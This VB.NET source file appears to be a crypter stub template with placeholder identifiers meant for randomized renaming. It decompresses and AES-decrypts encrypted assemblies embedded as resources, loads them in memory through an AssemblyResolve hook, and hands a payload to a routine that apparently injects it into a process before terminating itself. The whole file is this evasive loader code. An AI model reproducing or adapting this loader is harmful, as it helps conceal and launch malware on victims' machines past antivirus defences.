Imports Functions.Main
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        %SHIT0%.%SHIT1%()
    End Sub


End Class

Public Class %SHIT0%
    Shared Sub %SHIT2%()
        Dim %SHIT3% = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)

        If %SHIT3%.Item2 = True Then
            Dim %SHIT4% = New anti.IntegrityCheck
            %SHIT4%.AppExePath = Application.ExecutablePath
            %SHIT4%.AppPath = Application.StartupPath
            %SHIT4%.RunCheck()
        End If
        Award.Win.Run(%SHIT3%.Item1, Command, Application.ExecutablePath)
        Process.GetCurrentProcess.Kill()
    End Sub


    Public Shared Function %SHIT25%(%SHIT5% As Byte()) As Byte()
        Dim %SHIT6% = New IO.MemoryStream()
        Dim %SHIT7% = New IO.Compression.DeflateStream(New IO.MemoryStream(%SHIT5%), IO.Compression.CompressionMode.Decompress, True)
        Dim %SHIT8% = New Byte(4095) {}
        While True
            Dim %SHIT9% = %SHIT7%.Read(%SHIT8%, 0, %SHIT8%.Length)
            If %SHIT9% > 0 Then
                %SHIT6%.Write(%SHIT8%, 0, %SHIT9%)
            Else
                Exit While
            End If
        End While
        %SHIT7%.Close()
        Return %SHIT6%.ToArray()
    End Function



    Public Shared %SHIT24% As Boolean
    Shared Sub %SHIT1%()
        If Not %SHIT24% Then
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf %SHIT17%
            %SHIT24% = True
        End If
        %SHIT2%()
    End Sub
    Private Shared Function %SHIT10%(ByVal %SHIT23%() As Byte) As Byte()
        Dim %SHIT11% As New System.Security.Cryptography.RijndaelManaged
        Dim %SHIT12% As New System.Security.Cryptography.MD5CryptoServiceProvider

        Try
            Dim %SHIT13%(31) As Byte
            Dim %SHIT14% As Byte() = %SHIT12%.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Array.Copy(%SHIT14%, 0, %SHIT13%, 0, 16)
            Array.Copy(%SHIT14%, 0, %SHIT13%, 15, 16)
            %SHIT11%.Key = %SHIT13%
            %SHIT11%.Mode = Security.Cryptography.CipherMode.ECB
            Dim %SHIT15% As System.Security.Cryptography.ICryptoTransform = %SHIT11%.CreateDecryptor
            Dim %SHIT16%() As Byte = %SHIT15%.TransformFinalBlock(%SHIT23%, 0, %SHIT23%.Length)
            Return %SHIT16%
        Catch ex As Exception
            Return Nothing
        End Try
    End Function
    Private Shared Function %SHIT17%(sender As Object, %SHIT18% As System.ResolveEventArgs) As System.Reflection.Assembly
        'get the root namespace (im tired of manually adding this)
        Dim %SHIT19% As Reflection.[Assembly] = System.Reflection.Assembly.GetEntryAssembly
        Dim %SHIT20% As String = Strings.Left(%SHIT19%.EntryPoint.DeclaringType.Namespace, %SHIT19%.EntryPoint.DeclaringType.Namespace.ToString().IndexOf(".") + 1)
        'fuck ya! Im done manually adding that shit!!!
        Dim %SHIT21% As String = %SHIT20% + New Reflection.AssemblyName(%SHIT18%.Name).Name + ".dll"
        'resourceName = "dll.dll"
        Using %SHIT6% = Reflection.Assembly.GetExecutingAssembly.GetManifestResourceStream(%SHIT21%)

            Dim %SHIT22% = New Byte(%SHIT6%.Length - 1) {}
            'decode assembly here

            %SHIT6%.Read(%SHIT22%, 0, %SHIT22%.Length)
            %SHIT22% = %SHIT10%(%SHIT25%(%SHIT22%))
            Return Reflection.Assembly.Load(%SHIT22%)

        End Using ' stream
    End Function
End Class

Public Class Tuple(Of T1, T2)
    Public Property Item1() As T1
        Get
            Return m_Item1
        End Get
        Set
            m_Item1 = Value
        End Set
    End Property
    Private m_Item1 As T1
    Public Property Item2() As T2
        Get
            Return m_Item2
        End Get
        Set
            m_Item2 = Value
        End Set
    End Property
    Private m_Item2 As T2
    Public Sub New(Item1 As T1, Item2 As T2)
        Me.Item1 = Item1
        Me.Item2 = Item2
    End Sub
End Class